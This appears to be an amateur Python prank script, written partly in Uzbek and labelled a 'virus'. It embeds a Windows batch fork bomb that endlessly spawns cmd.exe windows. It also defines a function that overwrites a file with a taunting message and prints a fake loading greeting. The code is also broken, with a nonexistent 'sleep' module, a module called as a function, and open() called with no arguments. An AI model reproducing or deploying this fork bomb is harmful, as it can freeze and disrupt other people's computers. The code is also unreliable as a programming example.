import os
import sleep
n="\n"
virus=f'@echo off{n}CLS{n}:A{n}start cmd.exe{n}goto A{n}echo FATAL ERROR. VIRUS DETECTED!{n}pause'
'''with open('virus.bat','w') as s:
    s.write(virus)
    s.close()
'''
def virus(x,y):
    with open(x,f'{y}') as d:
        d.write('Mening Uyim shu yer. xa xa xa')
        d.close()
        open()
print(f'Assalom aleykum.\nKuting zagruzka...')
sleep(5)

